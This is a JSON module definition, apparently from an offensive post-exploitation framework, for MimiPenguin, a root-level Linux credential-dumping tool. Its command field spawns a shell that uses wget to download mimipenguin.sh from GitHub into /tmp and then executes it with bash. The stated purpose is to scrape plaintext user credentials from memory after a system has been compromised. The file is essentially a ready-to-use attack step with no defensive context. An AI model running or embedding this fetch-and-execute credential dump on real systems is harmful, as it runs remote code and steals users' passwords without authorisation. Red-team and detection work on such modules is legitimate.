{
  "base": {
    "name": "MimiPenguin",
    "author": ["Dan Borges (@ahhh"],
    "credits": ["Hunter Gregal (@HunterGregal)"],
    "path": ["linux", "x64", "bash", "credentials", "MimiPenguin.json"],
    "platform": "linux",
    "arch": "x64",
    "lang": "bash",
    "type": "standard",
    "privilege": true,
    "notes": "https://attack.mitre.org/wiki/Software/S0179",
    "remote": "https://raw.githubusercontent.com/huntergregal/mimipenguin/master/mimipenguin.sh",
    "local": ["data", "src", "huntergregal", "mimipenguin", "mimipenguin.sh"],
    "options": [],
    "description": "mimipenguin is a bash script used to find plaintext credentials in memory during post-exploitation. Must be run as root. It automates the dumping of memory and searches for Linux user credentials.",
    "commands": [
      "/bin/sh", "-c", "\"wget -O /tmp/mimipenguin.sh https://raw.githubusercontent.com/huntergregal/mimipenguin/beta-1.0/mimipenguin.sh; /bin/bash /tmp/mimipenguin.sh;\""
    ]
  }
}